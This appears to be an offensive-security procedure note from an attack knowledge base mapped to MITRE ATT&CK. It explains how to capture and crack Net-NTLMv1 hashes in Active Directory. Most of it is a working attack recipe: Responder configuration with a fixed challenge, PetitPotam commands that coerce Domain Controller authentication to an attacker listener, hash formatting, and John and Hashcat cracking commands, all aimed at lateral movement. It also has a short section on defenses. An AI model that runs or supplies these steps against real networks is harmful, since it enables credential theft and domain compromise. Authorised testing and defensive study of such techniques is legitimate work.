---
type: procedure
description: >-
  Captures Net-NTLMv1 hashes using Responder and PetitPotam coercion, then
  cracks them offline using John or Hashcat for credential access in Active
  Directory environments.
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.197722+00:00'
updated_at: '2023-04-10T20:35:59.601430+00:00'
tactics:
  - '[[tactics/Credential-Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral-Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Brute-Force|T1110 - Brute Force]]'
  - '[[techniques/Credential-Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Pass-the-Hash|T1075 - Pass the Hash]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Capturing and cracking Net-NTLMv1/NTLMv1 hashes]]'
commands:
  - '[[commands/responder-configure-custom-challenge]]'
  - '[[commands/petitpotam-py-coerce-auth]]'
  - '[[commands/petitpotam-exe-coerce-auth]]'
  - '[[commands/john-crack-netntlm]]'
  - '[[commands/hashcat-crack-netntlm]]'
platforms:
  - Windows
tools:
  - '[[tools/Responder]]'
  - '[[tools/PetitPotam]]'
  - '[[tools/Hashcat]]'
  - '[[tools/John-the-Ripper]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Capture-and-Crack-Net-NTLMv1-Hashes

## Summary

This procedure demonstrates how to capture Net-NTLMv1 hashes in an Active Directory environment by configuring Responder for NTLM poisoning and using PetitPotam to coerce machine authentication from a target, such as a Domain Controller. The captured hashes are then formatted and cracked offline using tools like John the Ripper or Hashcat, enabling pass-the-hash attacks for lateral movement and privilege escalation.

## Description

Net-NTLMv1 is a legacy authentication protocol in Windows environments that uses weak hashing, making it vulnerable to relay and cracking attacks. In this procedure, Responder is positioned to poison LLMNR/NBT-NS queries and respond to NTLM authentication attempts with a fixed challenge to facilitate cracking. PetitPotam exploits the MS-EFSRPC protocol to force a target machine (e.g., a Domain Controller) to authenticate to the attacker's Responder instance, capturing the Net-NTLMv1 response. Once captured, the hash is manually formatted into a crackable structure and attacked using dictionary, brute-force, or mask modes in cracking tools. This technique is effective in networks where NTLMv1 is still enabled and can lead to domain credential compromise. Prerequisites include network access to the target segment and initial foothold for running the tools.

## Requirements

1. Network access to the target's Active Directory domain segment (same subnet or routed access for poisoning).
2. Attacker machine with Responder, PetitPotam, John the Ripper, and Hashcat installed (Kali Linux recommended).
3. For authenticated PetitPotam: Valid domain credentials (username, password, domain).
4. Target details: Domain Controller IP, target machine IP (e.g., DC), and Responder listener IP.
5. Wordlist or mask for cracking (e.g., rockyou.txt for dictionary attacks).

## Defense

- Disable NTLMv1 via Group Policy (enforce NTLMv2 or Kerberos only) and monitor for legacy protocol usage.
- Implement LLMNR/NBT-NS poisoning protections using DNSSEC and disable these protocols where possible.
- Monitor for anomalous authentication attempts to non-DC servers (e.g., via Windows Event Logs ID 4624/4776) and network traffic for MS-EFSRPC (port 445 SMB).
- Use Extended Protection for Authentication (EPA) on services and deploy tools like Microsoft ATA for AD attack detection.
- Enforce strong password policies and monitor for offline cracking attempts via EDR tools.

## Objectives

1. Configure Responder to capture NTLMv1 hashes with a fixed challenge for easier cracking.
2. Coerce target authentication using PetitPotam to relay to Responder and capture the hash.
3. Format the captured Net-NTLMv1 hash for offline cracking.
4. Crack the hash to recover plaintext passwords for pass-the-hash or further attacks.
5. Use recovered credentials for lateral movement in the domain.

## Instructions

### Step 1: Configure Responder for NTLMv1 Capture with Custom Challenge

**Context**: Edit the Responder configuration to enable HTTPS, DNS, and LDAP poisoning, and set a fixed NTLM challenge. This ensures consistent hash responses that are easier to crack offline, as random challenges vary per session.

Use the [[commands/responder-configure-custom-challenge]] to update the config file, or manually edit `/etc/responder/Responder.conf` as follows:

**Code** ([[codes/responder-custom-challenge-config]]):

```ini
HTTPS = On
DNS = On
LDAP = On
...
; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
Challenge = 1122334455667788
```

> Save the file and start Responder with `responder -I eth0 -w -r -f` to enable poisoning modes. The fixed challenge allows pre-computed attacks on the response.

**Expected Output**: Responder logs show configuration loaded; no errors on startup.

### Step 2: Coerce Authentication Using PetitPotam (Authenticated Mode)

**Context**: Use PetitPotam to force the target machine (e.g., Domain Controller) to authenticate to your Responder instance via MS-EFSRPC, triggering an NTLMv1 challenge-response that Responder captures as a hash.

Execute [[commands/petitpotam-py-coerce-auth]] with your domain credentials to authenticate the coercion request:

```bash
PetitPotam.py -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -dc-ip $_DC_IP $_TARGET_IP $_RESPONDER_IP
```

> This command targets the machine at $_TARGET_IP, using the DC at $_DC_IP for resolution, and relays authentication to $_RESPONDER_IP where Responder is listening. For unauthenticated, use the .exe variant if no creds are available (patched in some environments).

**Expected Output**: PetitPotam output indicates successful coercion; Responder logs show incoming NTLM auth attempt and captured hash in `/usr/share/responder/logs/` (e.g., `NTLMv1-SSP-Client-Responder.pcap` or hash files).

### Step 3: Alternative Coercion Using PetitPotam (Unauthenticated Mode)

**Context**: If no initial credentials are available, use the unauthenticated PetitPotam.exe to coerce from the target. Note: This was patched around August 2021 for anonymous access, so test viability.

Execute [[commands/petitpotam-exe-coerce-auth]]:

```bash
PetitPotam.exe $_TARGET_IP $_RESPONDER_IP
```

> Replace $_TARGET_IP with the machine to coerce (e.g., DC IP) and $_RESPONDER_IP with your listener. Monitor Responder for the hash capture.

**Expected Output**: Success message from PetitPotam; captured hash appears in Responder's hash folder (e.g., `HASH: username::domain:challenge:response`).

### Step 4: Format the Captured Net-NTLMv1 Hash

**Context**: Responder captures the hash in raw format. Manually reformat it for cracking tools by extracting username, hostname, responses, and challenge, then structuring as NetNTLMv1 or NTHASH equivalents.

1. Locate the hash in Responder logs (e.g., `hashes.txt` or PCAP).
2. Extract components: username::hostname:response1:response2:challenge.
3. Format as: `username::hostname:response1:response2:challenge` for John, or convert to NTHASH for Hashcat: `NTHASH:response` prefixed.
4. Example formatted hash: `user::HOST:1122334455667788:LM_RESPONSE:NT_RESPONSE`.
5. Save to `hash.txt` and submit to online tools like crack.sh if needed, or proceed to cracking.

**Expected Output**: Validated format accepted by cracking tool without errors (e.g., John loads the hash file).

### Step 5: Crack the Formatted Hash Using John or Hashcat

**Context**: Use offline cracking to recover the plaintext password. Start with dictionary attacks; escalate to brute-force if needed. Net-NTLMv1 uses DES-based hashing, making it faster to crack than v2.

For John the Ripper, execute [[commands/john-crack-netntlm]]:

```bash
john --format=netntlm $_HASH_FILE --wordlist=/usr/share/wordlists/rockyou.txt
```

Or for brute-force/mask: `john --format=netntlm --incremental $_HASH_FILE`.

For Hashcat, execute [[commands/hashcat-crack-netntlm]]:

```bash
hashcat -m 5500 -a 0 $_HASH_FILE /usr/share/wordlists/rockyou.txt
```

> Use -a 0 for dictionary, -a 3 for brute-force mask (e.g., -a 3 ?l?l?l?l?d?d for patterns). Monitor progress; cracked passwords show in `hashcat.potfile` or John's output.

**Expected Output**: Cracked password displayed (e.g., `password123`), or status update if ongoing. Verify with `john --show --format=netntlm hash.txt`.
